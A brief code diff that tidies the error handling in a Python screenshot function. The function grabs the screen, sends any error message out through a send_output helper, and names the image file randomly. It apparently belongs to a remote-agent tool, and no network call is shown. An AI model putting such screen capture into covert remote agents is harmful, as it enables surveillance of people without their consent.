@@ -14,9 +14,8 @@ def run():
     try:
         image = ImageGrab.grab()
     except Exception as e:
-        message = "Error while trying to create the screenshot: %s" % (e)
-        utils.send_output(message)
-        return message
+        utils.send_output("Error while trying to create the screenshot: %s" % (e))
+        return
         
     filename = ''.join(random.choice(string.ascii_letters) for _ in range(5))
     filename += ".jpg"
